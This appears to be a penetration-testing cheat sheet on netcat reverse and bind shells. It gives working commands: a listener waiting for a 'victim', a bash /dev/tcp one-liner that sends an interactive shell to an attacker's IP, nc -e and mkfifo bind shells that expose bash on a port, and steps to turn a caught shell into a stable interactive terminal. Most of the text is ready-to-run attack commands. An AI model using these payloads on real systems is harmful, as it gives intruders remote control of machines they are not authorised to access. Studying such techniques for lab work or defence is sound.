# Linux Reverse Shells
## Netcat
**Role:** The "Swiss Army Knife" of networking. 
**Key Insight:** Netcat reads and writes data across network connections. We use it to transfer files, scan ports, and most importantly, **catch shells**.
### 1. Basic Interaction (Chat / Banner Grab)
**Goal:** Test connectivity between two machines.

**Listener (Server):**
```shell
# -l: Listen mode
# -v: Verbose (Print what happens)
# -n: No DNS resolution (Faster)
# -p: Port to listen on
nc -lvnp 7777
```

**Connector (Client):**
```shell
# Connect to the listener
nc -nv 10.129.2.15 7777
```
### 2. Reverse Shell (The Standard)
**Concept:** The **Target** connects back to **You**. **Why?** Most firewalls block _inbound_ traffic (preventing you from connecting to them) but allow _outbound_ traffic (allowing them to connect to you).

**1. Listener (Attacker):**
```shell
# Wait for the victim to call home
sudo nc -lvnp 443
```

**2. Payload (Target):**
```shell
# Linux (Bash One-Liner)
bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'

# Windows (PowerShell)
# Requires a script block or one-liner (See PayloadsAllTheThings)
```
### 3. Bind Shell (The Backup)
**Concept:** You connect directly to the **Target**. **Why?** Used when the target cannot connect out (e.g., no internet access), but you can reach it directly. 
**Risk:** Requires the target's firewall to allow inbound connections on your chosen port.

**1. Payload (Target):** **Goal:** Open a port (e.g., 7777) and pipe "bash" to anyone who connects.
```shell
# Method A: Netcat with -e (If available)
nc -lvnp 7777 -e /bin/bash

# Method B: The "Mkfifo" Trick (If -e is missing)
# Creates a named pipe to pass input/output back and forth
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 7777 > /tmp/f
```

**2. Connection (Attacker):**
```shell
# Connect to the waiting target
nc -nv 10.129.2.15 7777
```
### 4. Upgrade to TTY (Stabilize Shell)
**Context:** Standard Netcat shells are "dumb". They crash if you hit CTRL+C and don't support tab completion. 
**Goal:** Upgrade to a fully interactive TTY.
```shell
# 1. Inside the dumb shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Background the shell (CTRL + Z)

# 3. In your local terminal
stty raw -echo; fg

# 4. In the foregrounded shell
export TERM=xterm
# Hit Enter twice. You now have a stable shell.
```